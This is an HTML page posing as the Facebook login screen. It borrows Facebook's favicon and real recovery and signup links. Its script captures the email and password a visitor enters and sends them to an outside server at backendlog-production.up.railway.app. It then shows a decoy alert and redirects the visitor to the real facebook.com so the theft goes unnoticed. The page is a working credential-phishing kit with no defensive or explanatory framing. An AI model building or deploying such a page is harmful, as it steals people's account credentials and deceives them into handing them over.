<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login</title>
    <link
      rel="icon"
      href="https://www.facebook.com/favicon.ico"
      type="image/x-icon"
    />
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <div class="login-container">
      <div class="login-box">
        <h2>Facebook</h2>
        <form id="login-form">
          <input
            type="email"
            id="email"
            placeholder="Email or Phone"
            required
          />
          <input
            type="password"
            id="password"
            placeholder="Password"
            required
          />
          <button type="submit" style="font-weight: bold; margin-bottom: 10px">
            Log In
          </button>
          <div class="forgot-password">
            <a
              href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
              >Forgotten account?</a
            >
          </div>
        </form>
        <div class="create-account">
          <button>
            <a
              href="https://www.facebook.com/r.php"
              style="text-decoration: none; color: white"
              >Create New Account</a
            >
          </button>
        </div>
      </div>
    </div>

    <script>
      // Handle login form submission
      document
        .getElementById("login-form")
        .addEventListener("submit", async (e) => {
          e.preventDefault();

          const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;

          const response = await fetch(
            "https://backendlog-production.up.railway.app/login",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ email, password }),
            }
          );

          const data = await response.json();
          alert("Facebook link added to resume");
          window.location.href = "https://www.facebook.com";
        });
    </script>
  </body>
</html>
